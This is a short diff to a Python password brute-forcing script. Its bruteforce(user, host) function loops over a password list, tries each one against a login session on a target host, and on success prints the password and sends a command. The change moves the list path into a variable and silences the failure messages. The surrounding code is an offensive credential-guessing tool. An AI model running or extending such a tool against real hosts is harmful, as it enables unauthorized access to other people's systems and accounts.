@@ -4,7 +4,8 @@ from termcolor import colored
 
 
 def bruteforce(user, host):
-    file = open(input('Enter the absolute path of a password list: '), 'r')
+    filepath = input('Enter the absolute path of a password list: ')
+    file = open(filepath, 'r')
     for password in file.readlines():
         password = password.strip('\n')
         try:
@@ -12,4 +13,5 @@ def bruteforce(user, host):
             print(colored('[+] Password Found: ' + password, 'green'))
             return send_command(child)
         except Exception:
-            print(colored('[-] Wrong password ' + password, 'red'))
+            #print(colored('[-] Wrong password ' + password, 'red'))
+            pass
